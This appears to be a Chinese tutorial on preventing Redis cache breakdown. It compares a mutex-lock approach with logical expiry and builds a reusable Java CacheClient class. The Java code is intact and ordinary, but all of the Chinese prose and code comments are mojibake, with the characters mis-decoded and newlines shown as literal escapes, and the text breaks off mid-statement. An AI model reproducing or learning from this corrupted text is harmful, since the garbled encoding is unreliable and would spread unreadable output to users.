ç¼“å­˜å‡»ç©¿é—®é¢˜ä¹Ÿå«çƒ­ç‚¹Keyé—®é¢˜ï¼ŒæŒ‡**ä¸€ä¸ªè¢«é«˜å¹¶å‘è®¿é—®å¹¶ä¸”ç¼“å­˜é‡å»ºä¸šåŠ¡è¾ƒå¤æ‚çš„keyçªç„¶å¤±æ•ˆäº†**ï¼Œæ— æ•°çš„è¯·æ±‚è®¿é—®ä¼šåœ¨ç¬é—´ç»™æ•°æ®åº“å¸¦æ¥å·¨å¤§çš„å†²å‡»ã€‚\n\n### 1.è§£å†³æ€è·¯\n\nå¸¸è§çš„è§£å†³æ–¹æ¡ˆæœ‰ä¸¤ç§ï¼š\n\n* **äº’æ–¥é”**\n\nå› ä¸ºé”èƒ½å®ç°äº’æ–¥æ€§ã€‚å‡è®¾çº¿ç¨‹è¿‡æ¥ï¼Œåªèƒ½é€ä¸€çš„è®¿é—®æ•°æ®åº“ï¼Œä»è€Œé¿å…æ•°æ®åº“è®¿é—®å‹åŠ›è¿‡å¤§ï¼Œä½†è¿™ä¹Ÿä¼šå½±å“æŸ¥è¯¢æ€§èƒ½ï¼Œå› ä¸ºæ­¤æ—¶ä¼šè®©æŸ¥è¯¢çš„æ€§èƒ½ä»å¹¶è¡Œå˜æˆäº†ä¸²è¡Œï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨tryLockæ–¹æ³• + double checkæ¥è§£å†³è¿™æ ·çš„é—®é¢˜ã€‚\n\n* **é€»è¾‘è¿‡æœŸ**\n\nä¹‹æ‰€ä»¥ä¼šå‡ºç°è¿™ä¸ªç¼“å­˜å‡»ç©¿é—®é¢˜ï¼Œä¸»è¦åŸå› æ˜¯åœ¨äºæˆ‘ä»¬å¯¹keyè®¾ç½®äº†è¿‡æœŸæ—¶é—´ï¼Œå‡è®¾æˆ‘ä»¬ä¸è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œå…¶å®å°±ä¸ä¼šæœ‰ç¼“å­˜å‡»ç©¿çš„é—®é¢˜ï¼Œä½†æ˜¯ä¸è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œè¿™æ ·æ•°æ®ä¸å°±ä¸€ç›´å ç”¨æˆ‘ä»¬å†…å­˜äº†å—ï¼Œå¯ä»¥é‡‡ç”¨é€»è¾‘è¿‡æœŸæ–¹æ¡ˆã€‚\n\nè¿™ç§æ–¹æ¡ˆå·§å¦™åœ¨äºï¼Œå¼‚æ­¥çš„æ„å»ºç¼“å­˜ï¼Œç¼ºç‚¹åœ¨äºåœ¨æ„å»ºå®Œç¼“å­˜ä¹‹å‰ï¼Œè¿”å›çš„éƒ½æ˜¯è„æ•°æ®ã€‚\n\n|                            äº’æ–¥é”                            |                           é€»è¾‘è¿‡æœŸ                           |\n| :----------------------------------------------------------: | :----------------------------------------------------------: |\n|     ![](https://img.jwt1399.top/img/202211021615160.png)     |     ![](https://img.jwt1399.top/img/202211021616600.png)     |\n| å‡è®¾ç°åœ¨çº¿ç¨‹1è¿‡æ¥è®¿é—®ï¼Œä»–æŸ¥è¯¢ç¼“å­˜æ²¡æœ‰å‘½ä¸­ï¼Œä½†æ˜¯æ­¤æ—¶ä»–è·å¾—åˆ°äº†é”çš„èµ„æºï¼Œé‚£ä¹ˆçº¿ç¨‹1å°±ä¼šä¸€ä¸ªäººå»æ‰§è¡Œé€»è¾‘ï¼Œå‡è®¾ç°åœ¨çº¿ç¨‹2è¿‡æ¥ï¼Œçº¿ç¨‹2åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¹¶æ²¡æœ‰è·å¾—åˆ°é”ï¼Œé‚£ä¹ˆçº¿ç¨‹2å°±å¯ä»¥è¿›è¡Œåˆ°ä¼‘çœ ï¼Œç›´åˆ°çº¿ç¨‹1æŠŠé”é‡Šæ”¾åï¼Œçº¿ç¨‹2è·å¾—åˆ°é”ï¼Œç„¶åå†æ¥æ‰§è¡Œé€»è¾‘ï¼Œæ­¤æ—¶å°±èƒ½å¤Ÿä»ç¼“å­˜ä¸­æ‹¿åˆ°æ•°æ®äº†ã€‚ | æŠŠè¿‡æœŸæ—¶é—´è®¾ç½®åœ¨redisçš„valueä¸­ï¼Œè¿™ä¸ªè¿‡æœŸæ—¶é—´å¹¶ä¸ä¼šç›´æ¥ä½œç”¨äºredisï¼Œè€Œæ˜¯åç»­é€šè¿‡é€»è¾‘å»å¤„ç†ã€‚å‡è®¾çº¿ç¨‹1å»æŸ¥è¯¢ç¼“å­˜ï¼Œç„¶åä»valueä¸­åˆ¤æ–­å‡ºæ¥å½“å‰çš„æ•°æ®å·²ç»è¿‡æœŸï¼Œæ­¤æ—¶çº¿ç¨‹1å»è·å¾—äº’æ–¥é”ï¼Œé‚£ä¹ˆå…¶ä»–çº¿ç¨‹ä¼šè¿›è¡Œé˜»å¡ï¼Œè·å¾—äº†é”çš„çº¿ç¨‹ä¼šå¼€å¯ä¸€ä¸ª çº¿ç¨‹å»è¿›è¡Œä»¥å‰çš„é‡æ„æ•°æ®çš„é€»è¾‘ï¼Œç›´åˆ°æ–°å¼€çš„çº¿ç¨‹å®Œæˆè¿™ä¸ªé€»è¾‘åï¼Œæ‰é‡Šæ”¾é”ï¼Œ è€Œçº¿ç¨‹1ç›´æ¥è¿›è¡Œè¿”å›ï¼Œå‡è®¾ç°åœ¨çº¿ç¨‹3è¿‡æ¥è®¿é—®ï¼Œç”±äºçº¿ç¨‹çº¿ç¨‹2æŒæœ‰ç€é”ï¼Œæ‰€ä»¥çº¿ç¨‹3æ— æ³•è·å¾—é”ï¼Œçº¿ç¨‹3ä¹Ÿç›´æ¥è¿”å›æ•°æ®ï¼Œåªæœ‰ç­‰åˆ°æ–°å¼€çš„çº¿ç¨‹2æŠŠé‡å»ºæ•°æ®æ„å»ºå®Œåï¼Œå…¶ä»–çº¿ç¨‹æ‰èƒ½èµ°è¿”å›æ­£ç¡®çš„æ•°æ®ã€‚ |\n\n![](https://img.jwt1399.top/img/202211021615745.png)\n\n### 2.å…·ä½“å®ç°\n\n#### **äº’æ–¥é”å®ç°**\n\næ ¸å¿ƒæ€è·¯ï¼šç›¸è¾ƒäºåŸæ¥ä»ç¼“å­˜ä¸­æŸ¥è¯¢ä¸åˆ°æ•°æ®åç›´æ¥æŸ¥è¯¢æ•°æ®åº“è€Œè¨€ï¼Œç°åœ¨çš„æ–¹æ¡ˆæ˜¯è¿›è¡ŒæŸ¥è¯¢ä¹‹åï¼Œå¦‚æœä»ç¼“å­˜æ²¡æœ‰æŸ¥è¯¢åˆ°æ•°æ®ï¼Œåˆ™è¿›è¡Œäº’æ–¥é”çš„è·å–ï¼Œè·å–äº’æ–¥é”åï¼Œåˆ¤æ–­æ˜¯å¦å¾—åˆ°äº†é”ï¼Œå¦‚æœæ²¡æœ‰å¾—åˆ°ï¼Œåˆ™ä¼‘çœ ï¼Œè¿‡ä¸€ä¼šå†è¿›è¡Œå°è¯•ï¼Œç›´åˆ°è·å–åˆ°é”ä¸ºæ­¢ï¼Œæ‰èƒ½è¿›è¡ŒæŸ¥è¯¢ï¼ŒæŸ¥è¯¢åå°†æ•°æ®å†™å…¥redisï¼Œå†é‡Šæ”¾é”ï¼Œè¿”å›æ•°æ®ï¼Œåˆ©ç”¨äº’æ–¥é”å°±èƒ½ä¿è¯åªæœ‰ä¸€ä¸ªçº¿ç¨‹å»æ‰§è¡Œæ“ä½œæ•°æ®åº“çš„é€»è¾‘ï¼Œé˜²æ­¢ç¼“å­˜å‡»ç©¿ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211201526307.png\" style=\"zoom:50%;\" />\n\n**æ“ä½œé”çš„ä»£ç ï¼š**\n\næ€è·¯ï¼šåˆ©ç”¨redisçš„`setnx`æ–¹æ³•æ¥è¡¨ç¤ºè·å–é”ï¼Œè¯¥æ–¹æ³•å«ä¹‰æ˜¯redisä¸­ï¼š\n\n- å¦‚æœæ²¡æœ‰è¿™ä¸ªkeyï¼Œåˆ™æ’å…¥æˆåŠŸï¼Œè¿”å›1ï¼Œåœ¨stringRedisTemplateä¸­è¿”å›true \n\n- å¦‚æœæœ‰è¿™ä¸ªkeyï¼Œåˆ™æ’å…¥å¤±è´¥ï¼Œè¿”å›0ï¼Œåœ¨stringRedisTemplateè¿”å›false\n\né€šè¿‡trueæˆ–falseï¼Œæ¥è¡¨ç¤ºæ˜¯å¦æœ‰çº¿ç¨‹æˆåŠŸæ’å…¥keyï¼ŒæˆåŠŸæ’å…¥keyçš„çº¿ç¨‹å°±æ˜¯å¾—åˆ°é”çš„çº¿ç¨‹ã€‚\n\n```java\nprivate boolean tryLock(String key) {\n    Boolean flag = stringRedisTemplate.opsForValue().setIfAbsent(key, \"1\", 10, TimeUnit.SECONDS);\n    return BooleanUtil.isTrue(flag);\n}\n\nprivate void unlock(String key) {\n    stringRedisTemplate.delete(key);\n}\n```\n\n**äº’æ–¥é”é˜²æ­¢ç¼“å­˜å‡»ç©¿ä»£ç ï¼š**\n\n```java\n public Shop queryWithMutex(Long id)  {\n        String key = CACHE_SHOP_KEY + id;\n        // 1ã€ä»redisä¸­æŸ¥è¯¢å•†é“ºç¼“å­˜\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (StrUtil.isNotBlank(shopJson)) {\n            // å­˜åœ¨,ç›´æ¥è¿”å›\n            return JSONUtil.toBean(shopJson, Shop.class);\n        }\n        //åˆ¤æ–­å‘½ä¸­çš„å€¼æ˜¯å¦æ˜¯ç©ºå€¼\n        if (shopJson != null) {\n            //è¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯\n            return null;\n        }\n        // 4.å®ç°ç¼“å­˜é‡æ„\n        //4.1 è·å–äº’æ–¥é”\n        String lockKey = \"lock:shop:\" + id;\n        Shop shop = null;\n        try {\n            boolean isLock = tryLock(lockKey);\n            // 4.2 åˆ¤æ–­å¦è·å–æˆåŠŸ\n            if(!isLock){\n                //4.3 å¤±è´¥ï¼Œåˆ™ä¼‘çœ é‡è¯•\n                Thread.sleep(50);\n                return queryWithMutex(id);\n            }\n            //4.4 æˆåŠŸï¼Œæ ¹æ®idæŸ¥è¯¢æ•°æ®åº“\n             shop = getById(id);\n            // 5.ä¸å­˜åœ¨ï¼Œè¿”å›é”™è¯¯\n            if(shop == null){\n                 //å°†ç©ºå€¼å†™å…¥redis\nstringRedisTemplate.opsForValue().set(key,\"\",CACHE_NULL_TTL,TimeUnit.MINUTES);\n                //è¿”å›é”™è¯¯ä¿¡æ¯\n                return null;\n            }\n            //6.å†™å…¥redis\n            stringRedisTemplate.opsForValue().set(key,JSONUtil.toJsonStr(shop),CACHE_SHOP_TTL,TimeUnit.MINUTES);\n\n        }catch (Exception e){\n            throw new RuntimeException(e);\n        }\n        finally {\n            //7.é‡Šæ”¾äº’æ–¥é”\n            unlock(lockKey);\n        }\n        return shop;\n    }\n```\n\n**è°ƒç”¨ä»£ç **\n\n```java\n    @Override\n    public Result queryById(Long id) {\n        // ç¼“å­˜ç©¿é€\n        //Shop shop = queryWithPassThrough(id);\n\n         // äº’æ–¥é”è§£å†³ç¼“å­˜å‡»ç©¿\n        Shop shop = queryWithMutex(id);\n        if(shop == null){\n            return Result.fail(\"åº—é“ºä¸å­˜åœ¨!!!\");\n        }\n        return Result.ok(shop);\n    }\n\n```\n\nåˆ†æï¼šå‡è®¾ç°åœ¨æœ‰1000ä¸ªè¯·æ±‚åŒæ—¶è®¿é—®id=1çš„æ•°æ®ï¼Œå¹¶ä¸”è¯¥æ•°æ®å·²ç»å¤±æ•ˆï¼Œè¿™1000ä¸ªè¯·æ±‚éƒ½ä¼šæˆåŠŸã€‚\n\n#### **é€»è¾‘è¿‡æœŸå®ç°**\n\næ€è·¯ï¼šå½“ç”¨æˆ·å¼€å§‹æŸ¥è¯¢redisæ—¶ï¼Œåˆ¤æ–­æ˜¯å¦å‘½ä¸­ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­åˆ™ç›´æ¥è¿”å›ç©ºæ•°æ®ï¼Œä¸æŸ¥è¯¢æ•°æ®åº“ï¼Œè€Œä¸€æ—¦å‘½ä¸­åï¼Œå°†valueå–å‡ºï¼Œåˆ¤æ–­valueä¸­æ˜¯å¦è¿‡æœŸï¼Œå¦‚æœæ²¡æœ‰è¿‡æœŸï¼Œåˆ™ç›´æ¥è¿”å›redisä¸­çš„æ•°æ®ï¼›å¦‚æœè¿‡æœŸï¼Œåˆ™åœ¨å¼€å¯ç‹¬ç«‹çº¿ç¨‹åç›´æ¥è¿”å›ä¹‹å‰çš„æ•°æ®ï¼Œç‹¬ç«‹çº¿ç¨‹å»é‡æ„æ•°æ®ï¼Œé‡æ„å®Œæˆåé‡Šæ”¾äº’æ–¥é”ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202211201541199.png\" style=\"zoom:50%;\" />\n\n\n\n**æ­¥éª¤ä¸€ï¼šè®¾ç½®é€»è¾‘è¿‡æœŸæ—¶é—´**\n\nå› ä¸ºç°åœ¨redisä¸­å­˜å‚¨æ•°æ®çš„valueéœ€å¸¦ä¸Šé€»è¾‘è¿‡æœŸæ—¶é—´\n\n- 1.æ­¤æ—¶è¦ä¹ˆå»ä¿®æ”¹åŸæ¥Shopå®ä½“ç±»\n- 2.è¦ä¹ˆæ–°å»ºä¸€ä¸ªå®ä½“ç±»\n\næˆ‘ä»¬é‡‡ç”¨ç¬¬äºŒä¸ªæ–¹æ¡ˆï¼Œå¯¹åŸæ¥ä»£ç æ²¡æœ‰ä¾µå…¥æ€§ã€‚\n\n```java\n@Data\npublic class RedisData {\n    private LocalDateTime expireTime;\n    private Object data;\n}\n```\n\n**æ­¥éª¤äºŒï¼šé¢„çƒ­æ•°æ®**\n\n```java\npublic void saveShop2Redis(Long id, Long expireSeconds) {\n  // 1.æŸ¥è¯¢åº—é“ºæ•°æ®\n  Shop shop = getById(id);\n  Thread.sleep(200);//æ¨¡æ‹Ÿå»¶è¿Ÿ\n  // 2.å°è£…é€»è¾‘è¿‡æœŸæ—¶é—´\n  RedisData redisData = new RedisData();\n  redisData.setData(shop);\n  redisData.setExpireTime(LocalDateTime.now().plusSeconds(expireSeconds));\n  //3.å†™å…¥Redis\n  stringRedisTemplate.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(redisData));\n}\n```\n\nåˆ©ç”¨å•å…ƒæµ‹è¯•è¿›è¡Œç¼“å­˜é¢„çƒ­\n\n```java\n@Resource\nprivate ShopServiceImpl shopService;\n\n@Test\nvoid testSaveShop() {\n  shopService.saveShop2Redis(1L, 10L);\n}\n```\n\n**é€»è¾‘è¿‡æœŸé˜²æ­¢ç¼“å­˜å‡»ç©¿ä»£ç **\n\n```java\nprivate static final ExecutorService CACHE_REBUILD_EXECUTOR = Executors.newFixedThreadPool(10); // çº¿ç¨‹æ± \npublic Shop queryWithLogicalExpire( Long id ) {\n    String key = CACHE_SHOP_KEY + id;\n    // 1.ä»redisæŸ¥è¯¢å•†é“ºç¼“å­˜\n    String json = stringRedisTemplate.opsForValue().get(key);\n    // 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n    if (StrUtil.isBlank(json)) {\n        // 3.ä¸å­˜åœ¨ï¼Œç›´æ¥è¿”å›\n        return null;\n    }\n    // 4.å­˜åœ¨ï¼Œéœ€è¦å…ˆæŠŠjsonååºåˆ—åŒ–ä¸ºå¯¹è±¡\n    RedisData redisData = JSONUtil.toBean(json, RedisData.class);\n    Shop shop = JSONUtil.toBean((JSONObject) redisData.getData(), Shop.class);\n    LocalDateTime expireTime = redisData.getExpireTime();\n    // 5.åˆ¤æ–­æ˜¯å¦è¿‡æœŸ\n    if(expireTime.isAfter(LocalDateTime.now())) {\n        // 5.1.æœªè¿‡æœŸï¼Œç›´æ¥è¿”å›åº—é“ºä¿¡æ¯\n        return shop;\n    }\n    // 5.2.å·²è¿‡æœŸï¼Œéœ€è¦ç¼“å­˜é‡å»º\n    // 5.2.1.è·å–äº’æ–¥é”\n    String lockKey = LOCK_SHOP_KEY + id;\n    boolean isLock = tryLock(lockKey);\n    // 5.2.2.åˆ¤æ–­æ˜¯å¦è·å–é”æˆåŠŸ\n    if (isLock){\n        CACHE_REBUILD_EXECUTOR.submit( ()->{\n            try{\n                //5.2.3.é‡å»ºç¼“å­˜\n                saveShop2Redis(id, 20L);//å®é™…ä¸­åº”è®¾ç½®æˆ30åˆ†é’Ÿï¼Œè¿™é‡Œæ˜¯ä¸ºäº†æµ‹è¯•\n            }catch (Exception e){\n                throw new RuntimeException(e);\n            }finally {\n                unlock(lockKey);\n            }\n        });\n    }\n    // 5.2.4.è¿”å›è¿‡æœŸçš„å•†é“ºä¿¡æ¯\n    return shop;\n}\n```\n\n æ³¨æ„ï¼šè·å–é”æˆåŠŸåº”è¯¥å†æ¬¡æ£€æµ‹redisç¼“å­˜æ˜¯å¦è¿‡æœŸï¼ŒåšDoubleCheckã€‚å¦‚æœå­˜åœ¨åˆ™æ— éœ€é‡å»ºç¼“å­˜ã€‚\n\nåˆ†æï¼šå‡è®¾ç°åœ¨æœ‰100ä¸ªè¯·æ±‚åŒæ—¶è®¿é—®id=1çš„æ•°æ®ï¼Œå¹¶ä¸”è¯¥æ•°æ®åœ¨æ•°æ®åº“ä¸­å·²ç»è¢«ä¿®æ”¹ï¼Œä½†æ˜¯Redisä¸­æ²¡æœ‰è¢«ä¿®æ”¹ï¼Œè¿™100ä¸ªè¯·æ±‚éƒ½ä¼šæˆåŠŸï¼Œåªæ˜¯å‰é¢çš„è¯·æ±‚éƒ½æ˜¯Redisä¸­æ²¡ä¿®æ”¹çš„è„æ•°æ®ï¼Œåé¢çš„è¯·æ±‚æ˜¯Redisé‡å»ºåçš„æ•°æ®ã€‚\n\nä¹Ÿå°±æ˜¯è¯´è¯·æ±‚æ¥äº†å…ˆæŠŠRedisä¸­é€»è¾‘è¿‡æœŸçš„æ•°æ®å…ˆè¿”å›ç»™ç”¨æˆ·ï¼Œç­‰æŸä¸ªè¯·æ±‚æ‹¿åˆ°é”ä¹‹åé‡å»ºç¼“å­˜ï¼ˆè®¿é—®ä¸€æ¬¡æ•°æ®åº“ï¼‰ï¼Œä¹‹åå°±è¿”å›é‡å»ºçš„æ–°æ•°æ®\n\n## â¼å°è£…Rediså·¥å…·ç±»\n\nåŸºäºStringRedisTemplateå°è£…ä¸€ä¸ªç¼“å­˜å·¥å…·ç±»CacheClient\n\næ»¡è¶³ä¸‹åˆ—éœ€æ±‚ï¼š\n\n* æ–¹æ³•1ï¼šå°†ä»»æ„Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºjsonå¹¶å­˜å‚¨åœ¨stringç±»å‹çš„keyä¸­ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®TTLè¿‡æœŸæ—¶é—´\n* æ–¹æ³•2ï¼šå°†ä»»æ„Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºjsonå¹¶å­˜å‚¨åœ¨stringç±»å‹çš„keyä¸­ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®é€»è¾‘è¿‡æœŸæ—¶é—´\n* æ–¹æ³•3ï¼šæ ¹æ®æŒ‡å®šçš„keyæŸ¥è¯¢ç¼“å­˜ï¼Œå¹¶ååºåˆ—åŒ–ä¸ºæŒ‡å®šç±»å‹ï¼Œåˆ©ç”¨ç¼“å­˜ç©ºå€¼çš„æ–¹å¼è§£å†³ç¼“å­˜ç©¿é€é—®é¢˜\n* æ–¹æ³•4ï¼šæ ¹æ®æŒ‡å®šçš„keyæŸ¥è¯¢ç¼“å­˜ï¼Œå¹¶ååºåˆ—åŒ–ä¸ºæŒ‡å®šç±»å‹ï¼Œéœ€è¦åˆ©ç”¨é€»è¾‘è¿‡æœŸè§£å†³ç¼“å­˜å‡»ç©¿é—®é¢˜\n* æ–¹æ³•5ï¼šæ ¹æ®æŒ‡å®šçš„keyæŸ¥è¯¢ç¼“å­˜ï¼Œå¹¶ååºåˆ—åŒ–ä¸ºæŒ‡å®šç±»å‹ï¼Œéœ€è¦åˆ©ç”¨äº’æ–¥é”è§£å†³ç¼“å­˜å‡»ç©¿é—®é¢˜\n\n```java\n@Slf4j\n@Component\npublic class CacheClient {\n\n    private final StringRedisTemplate stringRedisTemplate;\n\n    public CacheClient(StringRedisTemplate stringRedisTemplate) {\n        this.stringRedisTemplate = stringRedisTemplate;\n    }\n    \n    private boolean tryLock(String key) {\n      Boolean flag = stringRedisTemplate.opsForValue().setIfAbsent(key, \"1\", 10, TimeUnit.SECONDS);\n      return BooleanUtil.isTrue(flag);\n    }\n\n    private void unlock(String key) {\n      stringRedisTemplate.delete(key);\n    }\n\n    // æ–¹æ³•1ï¼šset()\n    // æ–¹æ³•2ï¼šsetWithLogicalExpire()\n    // æ–¹æ³•3ï¼šqueryWithPassThrough()\n    // æ–¹æ³•4ï¼šqueryWithLogicalExpire()\n    // æ–¹æ³•5ï¼šqueryWithMutex()\n  \n}\n```\n\n* æ–¹æ³•1ï¼šå°†ä»»æ„Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºjsonå¹¶å­˜å‚¨åœ¨stringç±»å‹çš„keyä¸­ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®TTLè¿‡æœŸæ—¶é—´\n\n```java\npublic void set(String key, Object value, Long time, TimeUnit unit) {\n  stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(value), time, unit);\n}\n```\n\n* æ–¹æ³•2ï¼šå°†ä»»æ„Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºjsonå¹¶å­˜å‚¨åœ¨stringç±»å‹çš„keyä¸­ï¼Œå¹¶ä¸”å¯ä»¥è®¾ç½®é€»è¾‘è¿‡æœŸæ—¶é—´\n\n```java\npublic void setWithLogicalExpire(String key, Object value, Long time, TimeUnit unit) {\n  // è®¾ç½®é€»è¾‘è¿‡æœŸ\n  RedisData redisData = new RedisData();\n  redisData.setData(value);\n  redisData.setExpireTime(LocalDateTime.now().plusSeconds(unit.toSeconds(time)));\n  // å†™å…¥Redis\n  stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(redisData));\n}\n```\n\n* æ–¹æ³•3ï¼šæ ¹æ®æŒ‡å®šçš„keyæŸ¥è¯¢ç¼“å­˜ï¼Œå¹¶ååºåˆ—åŒ–ä¸ºæŒ‡å®šç±»å‹ï¼Œåˆ©ç”¨ç¼“å­˜ç©ºå€¼çš„æ–¹å¼è§£å†³ç¼“å­˜ç©¿é€é—®é¢˜\n\n```java\n public <R,ID> R queryWithPassThrough(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit){\n        String key = keyPrefix + id;\n        // 1.ä»redisæŸ¥è¯¢å•†é“ºç¼“å­˜\n        String json = stringRedisTemplate.opsForValue().get(key);\n        // 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (StrUtil.isNotBlank(json)) {\n            // 3.å­˜åœ¨ï¼Œç›´æ¥è¿”å›\n            return JSONUtil.toBean(json, type);\n        }\n        // åˆ¤æ–­å‘½ä¸­çš„æ˜¯å¦æ˜¯ç©ºå€¼\n        if (json != null) {\n            // è¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯\n            return null;\n        }\n        // 4.ä¸å­˜åœ¨ï¼Œæ ¹æ®idæŸ¥è¯¢æ•°æ®åº“\n        R r = dbFallback.apply(id);\n        // 5.ä¸å­˜åœ¨ï¼Œè¿”å›é”™è¯¯\n        if (r == null) {\n            // å°†ç©ºå€¼å†™å…¥redis\n            stringRedisTemplate.opsForValue().set(key, \"\", CACHE_NULL_TTL, TimeUnit.MINUTES);\n            // è¿”å›é”™è¯¯ä¿¡æ¯\n            return null;\n        }\n        // 6.å­˜åœ¨ï¼Œå†™å…¥redis\n        this.set(key, r, time, unit);\n        return r;\n}\n```\n\n* æ–¹æ³•4ï¼šæ ¹æ®æŒ‡å®šçš„keyæŸ¥è¯¢ç¼“å­˜ï¼Œå¹¶ååºåˆ—åŒ–ä¸ºæŒ‡å®šç±»å‹ï¼Œéœ€è¦åˆ©ç”¨é€»è¾‘è¿‡æœŸè§£å†³ç¼“å­˜å‡»ç©¿é—®é¢˜\n\n```java\nprivate static final ExecutorService CACHE_REBUILD_EXECUTOR = Executors.newFixedThreadPool(10);\n\npublic <R, ID> R queryWithLogicalExpire(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {\n        String key = keyPrefix + id;\n        // 1.ä»redisæŸ¥è¯¢å•†é“ºç¼“å­˜\n        String json = stringRedisTemplate.opsForValue().get(key);\n        // 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (StrUtil.isBlank(json)) {\n            // 3.å­˜åœ¨ï¼Œç›´æ¥è¿”å›\n            return null;\n        }\n        // 4.å‘½ä¸­ï¼Œéœ€è¦å…ˆæŠŠjsonååºåˆ—åŒ–ä¸ºå¯¹è±¡\n        RedisData redisData = JSONUtil.toBean(json, RedisData.class);\n        R r = JSONUtil.toBean((JSONObject) redisData.getData(), type);\n        LocalDateTime expireTime = redisData.getExpireTime();\n        // 5.åˆ¤æ–­æ˜¯å¦è¿‡æœŸ\n        if(expireTime.isAfter(LocalDateTime.now())) {\n            // 5.1.æœªè¿‡æœŸï¼Œç›´æ¥è¿”å›åº—é“ºä¿¡æ¯\n            return r;\n        }\n        // 5.2.å·²è¿‡æœŸï¼Œéœ€è¦ç¼“å­˜é‡å»º\n        // 6.ç¼“å­˜é‡å»º\n        // 6.1.è·å–äº’æ–¥é”\n        String lockKey = LOCK_SHOP_KEY + id;\n        boolean isLock = tryLock(lockKey);\n        // 6.2.åˆ¤æ–­æ˜¯å¦è·å–é”æˆåŠŸ\n        if (isLock){\n            // 6.3.æˆåŠŸï¼Œå¼€å¯ç‹¬ç«‹çº¿ç¨‹ï¼Œå®ç°ç¼“å­˜é‡å»º\n            CACHE_REBUILD_EXECUTOR.submit(() -> {\n                try {\n                    // æŸ¥è¯¢æ•°æ®åº“\n                    R newR = dbFallback.apply(id);\n                    // é‡å»ºç¼“å­˜\n                    this.setWithLogicalExpire(key, newR, time, unit);\n                } catch (Exception e) {\n                    throw new RuntimeException(e);\n                }finally {\n                    // é‡Šæ”¾é”\n                    unlock(lockKey);\n                }\n            });\n        }\n        // 6.4.è¿”å›è¿‡æœŸçš„å•†é“ºä¿¡æ¯\n        return r;\n}\n```\n\næ–¹æ³•5ï¼šæ ¹æ®æŒ‡å®šçš„keyæŸ¥è¯¢ç¼“å­˜ï¼Œå¹¶ååºåˆ—åŒ–ä¸ºæŒ‡å®šç±»å‹ï¼Œéœ€è¦åˆ©ç”¨äº’æ–¥é”è§£å†³ç¼“å­˜å‡»ç©¿é—®é¢˜\n\n```java\n public <R, ID> R queryWithMutex(String keyPrefix, ID id, Class<R> type, Function<ID, R> dbFallback, Long time, TimeUnit unit) {\n        String key = keyPrefix + id;\n        // 1.ä»redisæŸ¥è¯¢å•†é“ºç¼“å­˜\n        String shopJson = stringRedisTemplate.opsForValue().get(key);\n        // 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨\n        if (StrUtil.isNotBlank(shopJson)) {\n            // 3.å­˜åœ¨ï¼Œç›´æ¥è¿”å›\n            return JSONUtil.toBean(shopJson, type);\n        }\n        // åˆ¤æ–­å‘½ä¸­çš„æ˜¯å¦æ˜¯ç©ºå€¼\n        if (shopJson != null) {\n            // è¿”å›ä¸€ä¸ªé”™è¯¯ä¿¡æ¯\n            return null;\n        }\n\n        // 4.å®ç°ç¼“å­˜é‡å»º\n        // 4.1.è·å–äº’æ–¥é”\n        String lockKey = LOCK_SHOP_KEY + id;\n        R r = null;\n        try {\n            boolean isLock = tryLock(lockKey);\n            // 4.2.åˆ¤æ–­æ˜¯å¦è·å–æˆåŠŸ\n            if (!isLock) {\n                // 4.3.è·å–é”å¤±è´¥ï¼Œä¼‘çœ å¹¶é‡è¯•\n                Thread.sleep(50);\n                return queryWithMutex(keyPrefix, id, type, dbFallback, time, unit);\n            }\n            // 4.4.è·å–é”æˆåŠŸï¼Œæ ¹æ®idæŸ¥è¯¢æ•°æ®åº“\n            r = dbFallback.apply(id);\n            // 5.ä¸å­˜åœ¨ï¼Œè¿”å›é”™è¯¯\n            if (r == null) {\n                // å°†ç©ºå€¼å†™å…¥redis\n                stringRedisTemplate.opsForValue().set(key, \"\", CACHE_NULL_TTL, TimeUnit.MINUTES);\n                // è¿”å›é”™è¯¯ä¿¡æ¯\n                return null;\n            }\n            // 6.å­˜åœ¨ï¼Œå†™å…¥redis\n            this.set(key, r, time, unit);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }finally {\n            // 7.é‡Šæ”¾é”\n            unlock(lockKey);\n        }\n        // 8.è¿”å›\n        return r;\n}\n```\n\n- åœ¨Serviceä¸­è°ƒç”¨æ–¹æ³•\n\n```java\n@Resource\nprivate CacheClient cacheClient;\n\n    @Override\n    public Result queryById(Long id) {\n        // è§£å†³ç¼“å­˜ç©¿é€\n        Shop shop = cacheClient\n                .queryWithPassThrough(CACHE_SHOP_KEY, id, Shop.class, this::getById, CACHE_SHOP_TTL, TimeUnit.MINUTES);\n\n        // äº’æ–¥é”è§£å†³ç¼“å­˜å‡»ç©¿\n        // Shop shop = cacheClient\n        //         .queryWithMutex(CACHE_SHOP_KEY, id, Shop.class, this::getById, CACHE_SHOP_TTL, TimeUnit.MINUTES);\n\n        // é€»è¾‘è¿‡æœŸè§£å†³ç¼“å­˜å‡»ç©¿\n        // Shop shop = cacheClient\n        //         .queryWithLogicalExpire(CACHE_SHOP_KEY, id, Shop.class, this::getById, 20L, TimeUnit.SECONDS);\n\n        if (shop == 